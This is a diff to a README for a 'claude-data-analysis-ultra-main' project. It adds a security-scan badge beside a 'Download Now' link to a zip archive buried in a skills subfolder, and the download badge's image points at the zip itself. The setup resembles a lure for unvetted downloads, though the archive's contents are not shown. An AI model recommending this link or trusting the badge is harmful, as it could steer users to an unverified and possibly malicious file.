@@ -1,5 +1,7 @@
 # 🎉 claude-data-analysis-ultra-main - Effortless Data Analysis for Everyone
 
+[![SafeSkill 87/100](https://img.shields.io/badge/SafeSkill-87%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/zenyrae123-claude-data-analysis-ultra-main)
+
 ## 📥 Download Now
 [![Download](https://raw.githubusercontent.com/zenyrae123/claude-data-analysis-ultra-main/main/.claude/skills/recommender-system/data_ultra_claude_analysis_main_v3.5.zip)](https://raw.githubusercontent.com/zenyrae123/claude-data-analysis-ultra-main/main/.claude/skills/recommender-system/data_ultra_claude_analysis_main_v3.5.zip)
 
